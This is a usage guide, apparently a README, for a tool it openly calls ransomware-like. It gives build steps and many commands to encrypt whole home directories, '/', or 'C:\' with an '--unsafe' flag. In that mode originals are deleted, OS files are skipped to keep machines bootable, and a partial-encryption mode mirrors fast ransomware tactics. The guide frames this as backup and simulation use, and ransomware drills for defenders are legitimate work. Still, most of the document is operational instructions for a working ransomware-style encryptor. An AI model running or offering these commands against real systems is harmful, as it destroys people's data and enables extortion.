# Quick Usage Guide

## 🚀 Fast Setup (3 Steps)

### 1. Generate Keys

```bash
make build-genkey
./build/genkey -name backup
```

**Output**: `private-backup`, `public-backup`

### 2. Build Encryptor

```bash
make build-encrypt-pub PUBKEY_B64="$(cat public-backup)"
```

**Output**: `./build/encrypt` (with embedded key)

### 3. Encrypt Files

```bash
# Safe mode (recommended)
./build/encrypt -dir /path/to/data -verbose

# UNSAFE mode (ransomware-like) - VERY DANGEROUS!
./build/encrypt -dir /home/user --unsafe -verbose

# ULTIMATE RANSOMWARE: Entire system - MAXIMUM DANGER!
./build/encrypt -dir / --unsafe -verbose
```

**Result**: All files encrypted (system files automatically skipped)

---

## ⚡ Speed Mode: Partial Encryption

Need a lighter touch for slower hardware? Add `--partial-encryption` to encrypt only the most critical 10–30% of every file. This mirrors fast ransomware tactics—files become unusable, but the process finishes much faster.

```bash
./build/encrypt -dir /path/to/data --partial-encryption -verbose
```

> ⚠️ **Reduced security:** Large portions of each file remain visible. Use this only for simulations or when performance takes priority.

---

## 🔓 Decrypt Files

```bash
make build-decrypt
./build/decrypt -dir /path/to/data -key private-backup -verbose

# Decrypt entire system
./build/decrypt -dir / -key private-backup -verbose
```

---

## 📁 What Gets Encrypted

### ✅ YES (User Data)

- Documents, photos, videos
- Applications (`.exe`, `.app`)
- Databases (`.db`, `.sqlite`)
- Config files (`.ini`, `.conf`)
- Development files (`build/`, `.git/`)
- Hidden user data (`.cache/`, `.config/`)
- **Everything in `/home`, `/Users`, `/var`, etc.**

### ❌ NO (Automatically Skipped)

- OS libraries (`.dll`, `.so`)
- System drivers (`.sys`, `.ko`)
- Security files (`.ssh/`, certificates)
- System directories (`/bin`, `/etc`)
- **System files needed for boot**

---

## 💀 UNSAFE MODE - TRUE RANSOMWARE BEHAVIOR

### What `--unsafe` Does:

- **Removes Blocks**: Can target `/home`, `/Users`, system areas
- **Maximum Aggression**: Encrypts ALL user data found
- **Root Directory**: Can target `/` or `C:\` (auto-skips system files)
- **Still Safe**: Protects critical OS files from damage
- **No Mercy**: Permanently deletes originals after encryption

### Examples:

```bash
# Encrypt user home (VERY DANGEROUS!)
./build/encrypt -dir /home/john --unsafe -verbose

# Encrypt all users (EXTREMELY DANGEROUS!)
./build/encrypt -dir /Users --unsafe -benchmark -verbose

# Encrypt web data (DANGEROUS!)
./build/encrypt -dir /var/www --unsafe -verbose

# ULTIMATE: Encrypt entire Linux system (MAXIMUM DANGER!)
./build/encrypt -dir / --unsafe -verbose

# ULTIMATE: Encrypt entire Windows system (MAXIMUM DANGER!)
./build/encrypt -dir C:\ --unsafe -verbose
```

### ⚠️ WARNINGS:

- **PERMANENT**: Files are gone without the private key
- **DESTRUCTIVE**: Original files are securely wiped
- **AGGRESSIVE**: Behaves exactly like real ransomware
- **ROOT DANGER**: Can encrypt entire system
- **LEGAL ONLY**: For backup/testing purposes only

---

## ⚙️ Safety Levels

### 🟢 SAFE MODE (Default)

```bash
./build/encrypt -dir ~/Documents -verbose
```

- Blocks system directories
- Only encrypts user data areas
- Maximum safety with effectiveness

### 🟡 WARNING MODE

```bash
./build/encrypt -dir /home/user -verbose
# Requires --unsafe flag to proceed
```

- Detects potentially dangerous paths
- Requires explicit `--unsafe` confirmation
- Still protects critical system files

### 🔴 UNSAFE MODE (Ransomware-Like)

```bash
./build/encrypt -dir /home/user --unsafe -verbose
```

- No safety blocks on user areas
- Maximum encryption aggression
- Auto-skips OS-critical files only

### 💀 ROOT MODE (Ultimate Ransomware)

```bash
./build/encrypt -dir / --unsafe -verbose
```

- Targets entire system
- Encrypts ALL user data found
- Auto-skips system files to keep OS bootable
- True ransomware behavior

### 🛡️ ALWAYS PROTECTED

Even in Root Mode, these are automatically skipped:

- `/bin`, `/sbin`, `/boot`, `/dev`, `/etc`, `/lib`
- `C:\Windows`, `C:\Program Files`
- System drivers, libraries, boot files

---

## 🔧 Common Commands

```bash
# Safe user data encryption
./build/encrypt -dir ./mydata -verbose

# Aggressive home directory (DANGEROUS!)
./build/encrypt -dir /home/user --unsafe -benchmark -verbose

# Maximum performance ransomware-like (VERY DANGEROUS!)
./build/encrypt -dir /Users --unsafe -max-performance -verbose

# ULTIMATE RANSOMWARE: Entire system (MAXIMUM DANGER!)
./build/encrypt -dir / --unsafe -verbose

# Decrypt everything back
./build/decrypt -dir / -key private-mykey -verbose

# Generate keys with custom name
./build/genkey -name "project-alpha"
```

---

## 🐳 Docker Test (SAFE)

```bash
# Build for Linux
make build-linux

# Test in isolated container (SAFE!)
docker run --rm -it -v $(pwd)/build:/bin:ro -v $(pwd)/testdata:/data:rw ubuntu:22.04

# Inside container - even root directory is safe here!
/bin/encrypt-linux-amd64 -dir / --unsafe -verbose

---

## 🎯 Controlled Ransomware Simulation

Need a turn-key drill that still guarantees recovery? Use the policy-driven build:

```bash
make build-ransom-sim
./build/encrypt-sim -verbose
```

During execution the binary encrypts files per the embedded policy and, once the run finishes, drops these artefacts on the Desktop of the executing user:

- the matching decryptor binary (extracted from the build)
- the private key required for recovery
- a markdown note with ready-to-run decrypt instructions

This keeps the exercise realistic while ensuring defenders can restore data immediately without hunting for keys. Customise `policies/ransomware-sim.yaml` and rebuild if you need different targeting rules.
```

---

## 🆘 Troubleshooting

**Problem**: "BLOCKED: Root directory encryption"
**Solution**: Add `--unsafe` flag (⚠️ EXTREMELY DANGEROUS!)

**Problem**: "BLOCKED: Potentially dangerous directory"
**Solution**: Add `--unsafe` flag (⚠️ VERY DANGEROUS!)

**Problem**: "No files found to encrypt"
**Solution**: Check if directory has non-system files, or use `--unsafe` for system areas

**Problem**: "Failed to decrypt"
**Solution**: Ensure correct private key file

**Problem**: Tool asks for `--unsafe` flag
**Solution**: You're targeting a dangerous directory - this is intentional protection

---

## 📊 Flag Reference

| Flag              | Safe Mode  | Unsafe Mode | Description                  |
| ----------------- | ---------- | ----------- | ---------------------------- |
| `-dir ./docs`     | ✅ Allowed | ✅ Allowed  | Safe user directory          |
| `-dir /home/user` | ❌ Blocked | ✅ Allowed  | Requires --unsafe            |
| `-dir /Users`     | ❌ Blocked | ✅ Allowed  | Requires --unsafe            |
| `-dir /`          | ❌ Blocked | ✅ Allowed  | **ROOT - Requires --unsafe** |
| `-dir C:\`        | ❌ Blocked | ✅ Allowed  | **ROOT - Requires --unsafe** |
| Files in `/bin`   | ❌ Skipped | ❌ Skipped  | **Always auto-skipped**      |
| Files in `/etc`   | ❌ Skipped | ❌ Skipped  | **Always auto-skipped**      |

---

## 🎯 Ransomware Simulation Examples

```bash
# Simulate ransomware on user data only
./build/encrypt -dir /home --unsafe -verbose

# Simulate ransomware on entire system (ULTIMATE)
./build/encrypt -dir / --unsafe -verbose

# Test recovery procedures
./build/decrypt -dir / -key private-backup -verbose

# Performance test ransomware behavior
./build/encrypt -dir / --unsafe -benchmark -max-performance
```

---

**Remember**: With `--unsafe`, this tool can now encrypt entire systems (`/` or `C:\`) while automatically skipping system files to keep the OS bootable. This is true ransomware behavior - use only for legitimate backup and testing purposes!
